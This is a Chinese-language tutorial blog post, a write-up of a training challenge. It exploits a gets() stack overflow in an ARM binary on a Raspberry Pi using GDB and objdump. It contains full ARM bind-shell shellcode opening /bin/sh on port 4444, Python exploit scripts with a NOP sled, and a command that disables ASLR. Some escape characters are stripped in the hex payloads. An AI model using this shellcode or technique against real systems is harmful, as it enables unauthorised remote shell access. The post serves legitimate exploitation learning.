# ARM汇编之堆栈溢出实战分析（GDB）

阅读量 **345291**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-04 15:00:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01440f95e5b70da9fb.jpg)

## 引言

经过很长一段时间在[azeria-labs](https://azeria-labs.com/writing-arm-assembly-part-1/)进行的ARM基础汇编学习，学到了很多ARM汇编的基础知识、和简单的shellcode的编写，为了验证自己的学习成果，根据该网站提供的实例，做一次比较详细的逆向分析，和shellcode的实现，为自己的ARM入门学习巩固。

实例下载地址：git clone <https://github.com/azeria-labs/ARM-challenges.git>

调试环境：`Linux raspberrypi 4.4.34+ #3 Thu Dec 1 14:44:23 IST 2016 armv6l
GNU/Linux`+`GNU gdb (Raspbian 7.7.1+dfsg-5+rpi1)
7.7.1`（这些都是按照网站教程安装的如果自己有ARM架构的操作系统也是可以的）

## stack0

第一步，我们先看看文件的信息`file stack0`，从返回信息可以看出该程序是一个32位可执行程序，从最后的`not
stripped`可以看出这个程序的符号信息，具体有关stripped详细介绍可以百度

_stack0: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically
linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.32,
BuildID[sha1]=1171fa6db1d5176af44d6d462427f8d244bd82c8, not stripped_

下面我们给他执行权限`chmod +x
stack0`,然后执行它，会发现需要你的输入，表明这里使用了`gets`、`scanf`之类的输入方法，这些方法存在的地方就有 **溢出的风险**
，我们尝试构造一长一短的字符串，来测试一下。

短的字符串输出的让你重试的字样。

长的字符串，明显可以看出我们输入的值更改了变量导致，并且覆盖了`返回地址`，导致抛出`Segmentation
fault（访问了不可访问的内存，这个内存要么是不存在的，要么是受系统保护的）异常`

![](https://p4.ssl.qhimg.com/t015e647497fb34759f.png)

分析出它存在溢出漏洞，现在我们就需要进入他的内部世界，彻底的洞悉它

首先我们需要找到他的入口函数，因为他没有删除符号数据，我们直接执行`nm
stack0`，可以看到入口点、调用的库函数等信息，很明显入口点应该是`main`函数，我们来`gdb`走一波

    
    
             U abort@@GLIBC_2.4
    00020684 B __bss_end__
    00020684 B _bss_end__
    00020680 B __bss_start
    00020680 B __bss_start__
    00010360 t call_weak_fn
    00020680 b completed.9004
    00020678 D __data_start
    00020678 W data_start
    00010384 t deregister_tm_clones
    000103ec t __do_global_dtors_aux
    00020564 t __do_global_dtors_aux_fini_array_entry
    0002067c D __dso_handle
    0002056c d _DYNAMIC
    00020680 D _edata
    00020684 B _end
    00020684 B __end__
    00010510 T _fini
    00010414 t frame_dummy
    00020560 t __frame_dummy_init_array_entry
    0001055c r __FRAME_END__
             U gets@@GLIBC_2.4
    00020654 d _GLOBAL_OFFSET_TABLE_
             w __gmon_start__
    000102c8 T _init
    00020564 t __init_array_end
    00020560 t __init_array_start
    00010518 R _IO_stdin_used
             w _ITM_deregisterTMCloneTable
             w _ITM_registerTMCloneTable
    00020568 d __JCR_END__
    00020568 d __JCR_LIST__
             w _Jv_RegisterClasses
    0001050c T __libc_csu_fini
    000104a8 T __libc_csu_init
             U __libc_start_main@@GLIBC_2.4
    0001044c T main
             U puts@@GLIBC_2.4
    000103b4 t register_tm_clones
    00010324 T _start
    00020680 D __TMC_END__
    

gef>`disas
stack0`，我们可以看见得到main函数的反汇编代码，但是有一点不爽的是一些`库函数API`名称没有显示出来，这里提供两种解决思路：

  * **升级gdb版本** （百度、google找教程，我升级到8.2版本是可以显示的。`这里有点奇怪的是，我的版本已经很高了，但是对这个二进制文件还是不能识别库函数并显示并且stripped前后都显示不了，但是对于有些二进制文件它又可以显示，如果有大佬知道，希望在评论里帮助解惑一下，thanks`）
  * **objdump** 了解一下，这里我主要用的是objdump

    
    
    Dump of assembler code for function main:
       0x0001044c <+0>:    push    {r11, lr}
       0x00010450 <+4>:    add    r11, sp, #4
       0x00010454 <+8>:    sub    sp, sp, #80    ; 0x50
       0x00010458 <+12>:    str    r0, [r11, #-80]    ; 0x50
       0x0001045c <+16>:    str    r1, [r11, #-84]    ; 0x54
       0x00010460 <+20>:    mov    r3, #0
       0x00010464 <+24>:    str    r3, [r11, #-8]
       0x00010468 <+28>:    sub    r3, r11, #72    ; 0x48
       0x0001046c <+32>:    mov    r0, r3
       0x00010470 <+36>:    bl    0x102e8
       0x00010474 <+40>:    ldr    r3, [r11, #-8]
       0x00010478 <+44>:    cmp    r3, #0
       0x0001047c <+48>:    beq    0x1048c <main+64>
       0x00010480 <+52>:    ldr    r0, [pc, #24]    ; 0x104a0 <main+84>
       0x00010484 <+56>:    bl    0x102f4
       0x00010488 <+60>:    b    0x10494 <main+72>
       0x0001048c <+64>:    ldr    r0, [pc, #16]    ; 0x104a4 <main+88>
       0x00010490 <+68>:    bl    0x102f4
       0x00010494 <+72>:    mov    r0, r3
       0x00010498 <+76>:    sub    sp, r11, #4
       0x0001049c <+80>:    pop    {r11, pc}
       0x000104a0 <+84>:    andeq    r0, r1, r12, lsl r5
       0x000104a4 <+88>:    andeq    r0, r1, r8, asr #10
    End of assembler dump.
    

objdump打印的结果，下面省略了一些显示，把主要分析的部分放出来，并且可以看到所有区段的反汇编代码和地址，这样我们对照着这个输出信息，即可

    
    
    stack0:     file format elf32-littlearm
    
    
    Disassembly of section .init:
    
    000102c8 <_init>:
       102c8:    e92d4008     push    {r3, lr}
       102cc:    eb000023     bl    10360 <call_weak_fn>
       102d0:    e8bd8008     pop    {r3, pc}
    
    Disassembly of section .plt:
    
    000102d4 <gets@plt-0x14>:
       102d4:    e52de004     push    {lr}        ; (str lr, [sp, #-4]!)
       102d8:    e59fe004     ldr    lr, [pc, #4]    ; 102e4 <_init+0x1c>
       102dc:    e08fe00e     add    lr, pc, lr
       102e0:    e5bef008     ldr    pc, [lr, #8]!
       102e4:    00010370     .word    0x00010370
    
    000102e8 <gets@plt>:
       102e8:    e28fc600     add    ip, pc, #0, 12
       102ec:    e28cca10     add    ip, ip, #16, 20    ; 0x10000
       102f0:    e5bcf370     ldr    pc, [ip, #880]!    ; 0x370
    
    000102f4 <puts@plt>:
       102f4:    e28fc600     add    ip, pc, #0, 12
       102f8:    e28cca10     add    ip, ip, #16, 20    ; 0x10000
       102fc:    e5bcf368     ldr    pc, [ip, #872]!    ; 0x368
    
    00010300 <__libc_start_main@plt>:
       10300:    e28fc600     add    ip, pc, #0, 12
       10304:    e28cca10     add    ip, ip, #16, 20    ; 0x10000
       10308:    e5bcf360     ldr    pc, [ip, #864]!    ; 0x360
    
    0001030c <__gmon_start__@plt>:
       1030c:    e28fc600     add    ip, pc, #0, 12
       10310:    e28cca10     add    ip, ip, #16, 20    ; 0x10000
       10314:    e5bcf358     ldr    pc, [ip, #856]!    ; 0x358
    
    00010318 <abort@plt>:
       10318:    e28fc600     add    ip, pc, #0, 12
       1031c:    e28cca10     add    ip, ip, #16, 20    ; 0x10000
       10320:    e5bcf350     ldr    pc, [ip, #848]!    ; 0x350
    
    Disassembly of section .text:
    
    00010324 <_start>:
       10324:    e3a0b000     mov    fp, #0
       10328:    e3a0e000     mov    lr, #0
       1032c:    e49d1004     pop    {r1}        ; (ldr r1, [sp], #4)
       10330:    e1a0200d     mov    r2, sp
       10334:    e52d2004     push    {r2}        ; (str r2, [sp, #-4]!)
       10338:    e52d0004     push    {r0}        ; (str r0, [sp, #-4]!)
       1033c:    e59fc010     ldr    ip, [pc, #16]    ; 10354 <_start+0x30>
       10340:    e52dc004     push    {ip}        ; (str ip, [sp, #-4]!)
       10344:    e59f000c     ldr    r0, [pc, #12]    ; 10358 <_start+0x34>
       10348:    e59f300c     ldr    r3, [pc, #12]    ; 1035c <_start+0x38>
       1034c:    ebffffeb     bl    10300 <__libc_start_main@plt>        ;这个库函数获取了main函数的地址，开启了main函数的执行流程
       10350:    ebfffff0     bl    10318 <abort@plt>
       10354:    0001050c     .word    0x0001050c
       10358:    0001044c     .word    0x0001044c               ;很明显这是main函数的地址
       1035c:    000104a8     .word    0x000104a8
    ...............
    
    0001044c <main>:
       1044c:    e92d4800     push    {fp, lr}
       10450:    e28db004     add    fp, sp, #4
       10454:    e24dd050     sub    sp, sp, #80    ; 0x50
       10458:    e50b0050     str    r0, [fp, #-80]    ; 0xffffffb0
       1045c:    e50b1054     str    r1, [fp, #-84]    ; 0xffffffac
       10460:    e3a03000     mov    r3, #0
       10464:    e50b3008     str    r3, [fp, #-8]
       10468:    e24b3048     sub    r3, fp, #72    ; 0x48
       1046c:    e1a00003     mov    r0, r3
       10470:    ebffff9c     bl    102e8 <gets@plt>
       10474:    e51b3008     ldr    r3, [fp, #-8]
       10478:    e3530000     cmp    r3, #0
       1047c:    0a000002     beq    1048c <main+0x40>
       10480:    e59f0018     ldr    r0, [pc, #24]    ; 104a0 <main+0x54>
       10484:    ebffff9a     bl    102f4 <puts@plt>
       10488:    ea000001     b    10494 <main+0x48>
       1048c:    e59f0010     ldr    r0, [pc, #16]    ; 104a4 <main+0x58>
       10490:    ebffff97     bl    102f4 <puts@plt>
       10494:    e1a00003     mov    r0, r3
       10498:    e24bd004     sub    sp, fp, #4
       1049c:    e8bd8800     pop    {fp, pc}
       104a0:    0001051c     .word    0x0001051c
       104a4:    00010548     .word    0x00010548
    ..............
    

下面进行逐步分析：

  1. 保存了`当前栈帧的返回地址`和`上一个栈帧`的帧地址。  
将`帧指针r11`指向当前栈帧顶部的返回地址  
压栈操作，压入大小为80字节的空间，为变量、参数准备的临时存放空间。  
将`r0, r1`进行入栈操作，并且放在`栈顶`的位置，这是`上一个栈帧`的变量，我们需要保护起来。

    
        0x0001044c <+0>:    push    {r11, lr}
    0x00010450 <+4>:    add    r11, sp, #4
    0x00010454 <+8>:    sub    sp, sp, #80    ; 0x50
    0x10458 <main+12>        str    r0,  [r11,  #-80]    ; 0x50
    

  2. 给`r3`寄存器赋0值，然后将r3内的0存放到`r11-8`内存地址指向的空间，这个地址是临着`上一个栈帧的帧指针r11-4`（r11是当前栈帧的帧指针，指向当前栈帧顶部，顶部存放着返回地址） 
    
           0x1045c <main+16>        str    r1,  [r11,  #-84]    ; 0x54
       0x10460 <main+20>        mov    r3,  #0
       0x10464 <main+24>        str    r3,  [r11,  #-8]
    

  3. 将r11-0x48（`0xbefff0e4`）的地址通过r3赋值给r0，然后作为参数传进`gets`函数中执行，这个函数会将用户输入的内容，存放到0xbefff0e4这个地址空间中 
    
        ->   0x10468 <main+28>        sub    r3,  r11,  #72    ; 0x48，上一个指针的两个变量存储用了8字节空间，刚好从r11-72的地址开始给当前栈帧的
                                                     ;参数使用
       0x1046c <main+32>        mov    r0,  r3
       0x10470 <main+36>        bl     0x102e8 <gets[@plt](https://github.com/plt "@plt")>
    

  4. 开始输入字符串，测试溢出  
下面显示地址空间存储的值，`0xbefff0e4`地址是存放用户输入字符串开始的位置，下面我们尝试输入不同的字符来看下面这些地址存放的值的变化

    
        gef> x/19x 0xbefff0e4
    0xbefff0e4:    0xb6ffbfc4    0x00000003    0xb6e77be8    0x00000000
    0xbefff0f4:    0xb6e779f8    0xbefff130    0xb6fd618c    0x00000000
    0xbefff104:    0x00000000    0x00010414    0x000104f8    0xb6fb2ba0
    0xbefff114:    0x000104a8    0x00000000    0x00010324    0x00000000
    0xbefff124:    0x00000000    0x00000000    0xb6e8c294
    

尝试输入4个1后的结果输出，很明显`0xb6ffbfc4
0x00000003`中前四个字节被`0x31313131`（1的16进制）覆盖了，`0x00000003`这个值内的`03`被gets函数默认用`0x00`覆盖用来标志字符串的结尾

    
        gef> x/19x 0xbefff0e4
    0xbefff0e4:    0x31313131    0x00000000    0xb6e77be8    0x00000000
    0xbefff0f4:    0xb6e779f8    0xbefff130    0xb6fd618c    0x00000000
    0xbefff104:    0x00000000    0x00010414    0x000104f8    0xb6fb2ba0
    0xbefff114:    0x000104a8    0x00000000    0x00010324    0x00000000
    0xbefff124:    0x00000000    0x00000000    0xb6e8c294
    

下面我们直接输入足够的长度，一直到返回地址处，根据上面的`sub r3, r11,
#72`语句，将r11-72出作为存放用户输入的初始地址，可以知道，输入的长度至少72，这样`0xb6e8c294`最低位`94`会被`00`覆盖，下面我们进行输入72个1的覆盖，很明显我们如我们所料。（可以多输入几个字符完全覆盖，因为只覆盖最低位两个字符，可能依然会存在该地址，而导致不能实现程序的崩溃）

    
        0xbefff0e4:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff0f4:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff104:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff114:    0x31313131    0x31313131    0x31313131    0x31313131
    0xbefff124:    0x31313131    0x31313131    0xb6e8c200
    

  5. 最后一步—-`shellcode`。构造一个shellcode来利用这个溢出漏洞，最一个完美的结尾。具体shellcode编写可以参考我的另一篇文章：<https://www.jianshu.com/p/16f1c9fe8541>  
shellcode代码—-BindShell

    
    
    .section .text
    .global _start
    _start:
        .code 32
        //arm set switch thumb set
        add r3, pc, #1
        bx r3
    
        .code 16
        //create a socket 
        mov r0, #2
        mov r1, #1
        sub r2, r2, r2
        mov r7, #200
        add r7, #81    
        svc #1    
    
        //bind local address
        mov r4, r0
        adr r1, local_addr
        strb r2, [r1, #1]
        strh r2, [r1, #4]
        nop
        strb r2, [r1, #6]
        strb r2, [r1, #7]
        mov r2, #16
        add r7, #1
        svc #1
        //start listen,wait for connection
        mov r0, r4
        mov r1, #2
        add r7, #2
        svc #1
    
        //accept first connection
        mov r0, r4
        eor r1, r1, r1
        eor r2, r2, r2
        add r7, #1
        svc #1
        mov r4, r0
    
        //change stdin/stdout/stderr to /bin/sh
        mov r0, r4
        sub r1, r1, r1
        mov r7, #63
        svc #1
    
        mov r0, r4
        mov r1, #1
        svc #1
    
        mov r0, r4
        mov r1, #2
        svc #1
    
        //execve("/bin/sh")
        adr r0, bin_sh
        eor r1, r1, r1
        eor r2, r2, r2
        strb r2, [r0, #7]
        mov r7, #11
        svc #1
    
    local_addr:
    .ascii "x02xff"
    .ascii "x11x5c"
    .byte 1,1,1,1
    
    bin_sh:
    .ascii "/bin/shX"
    

`hexdump -v -e '"\""x" /1 "%02x" ""' bindshell.bin`生成十六进制的shellcode

`x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx11xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx20x1cx02x21x02x37x01xdfx20x1cx49x40x52x40x01x37x01xdfx04x1cx20x1cx49x1ax3fx27x01xdfx20x1cx01x21x01xdfx20x1cx02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58`

写好shellcode之后，我们需要找到`合适的位置`，存放好shellcode保证程序可以正常执行shellcode，根据上面的分析，可以得到返回地址`0xb6e8c294`存放的内存地址是0xbefff124+8=`0xbefff12c`，而我们溢出的数据会一直向栈空间下面延伸，所以我们可以`将返回地址改成0xbefff12c+4`的位置，这样就会执行到后面的shellcode代码

    
    
    0xbefff124: 0x00000000  0x00000000  0xb6e8c294
    

第一步：现将返回地址覆盖为`0xbefff130`，这里我使用python脚本来实现填充字符、和返回地址的覆盖。然后`python poc.py
>exp`,把shellcode写入exp文件，在gdb里使用`r <
exp`命令，把exp文件作为输入，来执行stack0文件。可以看到`r11`指向的`返回地址`，存储的值刚好是`下一个栈地址`

`poc.py`

    
    
    port struct
    padding = "111111111111111111111111111111111111111111111111111111111111111111111111"
    //把0xbefff130转成字符串，格式为`I`unsigned int（四字节长度刚好）
    return_addr = struct.pack("I", 0xbefff130)
    
    print padding + return_addr
    

结果：

    
    
    0xbefff128|+0x0000: 0x31313131    <-$sp
    0xbefff12c|+0x0004: 0xbefff130 -> 0xb6fb1000 -> 0x0013cf20    <-$r11
    0xbefff130|+0x0008: 0xb6fb1000 -> 0x0013cf20
    

然后在python脚本内再添加shellcode后，完整的脚本如下：

    
    
    import struct
    padding = "111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xbefff130)
    
    payload = "x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx11xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx20x1cx02x21x02x37x01xdfx20x1cx49x40x52x40x01x37x01xdfx04x1cx20x1cx49x1ax3fx27x01xdfx20x1cx01x21x01xdfx20x1cx02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    
    print padding + return_addr + payload
    

当我们使用`gdb`运行`r < exp`调试的时候，查询端口可以看见，`4444`端口已经开始侦听，exp成功执行

    
    
    tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN
    

这个时候我们使用`nc -vv 127.0.0.1 4444`,远程连接，客户端和服务端成功连接上，执行命令也成功返回

客户端返回：

    
    
    pi@raspberrypi:~/Desktop $ nc -vv 127.0.0.1 4444
    Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
    whoami
    pi
    ps
      PID TTY          TIME CMD
      572 pts/0    00:00:33 bash
     6522 pts/0    00:00:06 gdb
     6526 pts/0    00:00:00 sh
     6534 pts/0    00:00:00 ps
    

服务端返回结果，显示开启了一个新的进程来运行`/bin/sh`

    
    
    gef> r < exp
    Starting program: /home/pi/Desktop/ARM-challenges/stack0 < exp
    you have changed the 'modified' variable
    process 6526 is executing new program: /bin/dash
    

  1. 环境变量的影响—-NOP技术，生成新进程的问题  
针对第6步的调试成功之后，当我们直接运行`./stack0
<exp`的时候，返回错误如下。所以我们单开最后一个步骤，来处理出现的问题。这个问题主要的原因就是栈内环境变量不同导致栈发生了小幅度的偏移，影响了shellcode的位置。  
`you have changed the 'modified' variable`  
`Segmentation fault`

我们使用`gdb /home/pi/Desktop/ARM-challenges/stack0`和`gdb
./stack0`来调试完整路径下的程序，并且在执行shellcode前设置断点，并且定义`hook-stop`来在执行断点前打印栈数据,运行`r<exp`后观察返回的栈数据，很明显栈数据发生了很大的变化

    
    
    gef> define hook-stop
    Type commands for definition of "hook-stop".
    End with a line saying just "end".
    >x/8wx $sp
    >end
    

返回栈数据结果

    
    
    gdb ./stack0
    0xbefff128:    0x31313131    0xbefff130    0xe28f3001    0xe12fff13
    0xbefff138:    0x21012002    0x27c81a92    0xdf013751    0xa1111c04
    
    
    gdb /home/pi/Desktop/ARM-challenges/stack0
    0xbefff138:    0x00000000    0xb6e8c294    0xb6fb1000    0xbefff294
    0xbefff148:    0x00000001    0x0001044c    0xb6ffe0b8    0xb6ffddc0
    

下面尝试打印1000行栈数据`x/1000s
$sp`，观察不同，具体不同的地方就是存放环境变量的地方，如下所示，地址`0xbefffcdd`的数据还是相同的，但是因为`pwd变量的长度不一致，导致了需用用更多的栈空间存储多余的数据，所以从这往后，栈内数据发生了变化`

    
    
    gdb ./stack0的输出
    0xbefffc8c:    "_=/usr/bin/gdb"
    0xbefffc9b:    "LC_IDENTIFICATION=zh_CN.UTF-8"
    0xbefffcb9:    "PWD=/home/pi/Desktop/ARM-challenges"
    0xbefffcdd:    "LANG=en_GB.UTF-8"
    
    
    gdb /home/pi/Desktop/ARM-challenges/stack0的输出
    0xbefffc9b:    "_=/usr/bin/gdb"
    0xbefffcaa:    "LC_IDENTIFICATION=zh_CN.UTF-8"
    0xbefffcc8:    "PWD=/home/pi/Desktop"
    0xbefffcdd:    "LANG=en_GB.UTF-8"
    

**具体解决方案：**

  * 执行前删除环境变量

    
    
    shell$ env -i ./stack0
    (gdb) unset env
    

  * `NOP`:使用NOP滑到我们的shellcode处，然后我们将加入100个NOP到shellcode中，下面这个python脚本才是最终的脚本！

    
    
    import struct
    padding = "111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xbefff130)
    
    payload = "x01x30x8fxe2x13xffx2fxe1x02x20x01x21x92x1axc8x27x51x37x01xdfx04x1cx11xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx20x1cx02x21x02x37x01xdfx20x1cx49x40x52x40x01x37x01xdfx04x1cx20x1cx49x1ax3fx27x01xdfx20x1cx01x21x01xdfx20x1cx02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    
    print padding + return_addr + "x90"*100 + payload
    

至此我们解决了环境变量引起的`栈数据移动问题`，当我们在次执行`./stack0 < exp`

    
    
    you have changed the 'modified' variable
    Segmentation fault
    

由这个问题引入一个概念 **ASLR**`Address Space Layout Randomization，地址空间布局随机化`

Linux 平台上 ASLR 分为 0，1，2 三级，用户可以通过一个内核参数 randomize_va_space
进行等级控制。它们对应的效果如下。更详细的介绍大家百度

  * 0：没有随机化。即关闭 ASLR。
  * 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化。
  * 2：完全的随机化。在 1 的基础上，通过 brk() 分配的内存空间也将被随机化  
这里我们使用命令来改变这个值：  
`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

下面就是见证奇迹的时候了：

![](https://p5.ssl.qhimg.com/t014f32699ab6b904a3.png)

## 小结

至此本篇paper基本完成，这个实例其实是很入门的东西，但是整套流程坐下来，却很有意义，希望给大家一些帮助。当然，过程中遇见了很多的问题，学习的路上很枯燥，我们需要耐着性子稳步前行，做完这个例子我收获了很多，感谢自己、也感谢帮我的优秀老铁：`大毛腿`。

> 附录文章：  
>  [1] ARM汇编学习网站<https://azeria-labs.com/writing-arm-assembly-part-1/>  
>  [2] 实战样本下载地址<https://github.com/azeria-labs/ARM-challenges.git>  
>  [3] shellcode学习编写地址<https://www.jianshu.com/p/16f1c9fe8541>  
>  [4]
> 在溢出中使用shellcode教程<https://www.youtube.com/98c2a1d3-3d69-4931-9f27-bd457a464f38>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **勤学奋进小郎君** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/169071](/post/id/169071)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [逆向工程](/tag/逆向工程)
  * [shellcode](/tag/shellcode)
  * [arm](/tag/arm)
  * [汇编](/tag/汇编)

 **+1** __7赞

 __收藏

![](https://p3.ssl.qhimg.com/t01fab72861c8ea0c9b.png) 勤学奋进小郎君

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

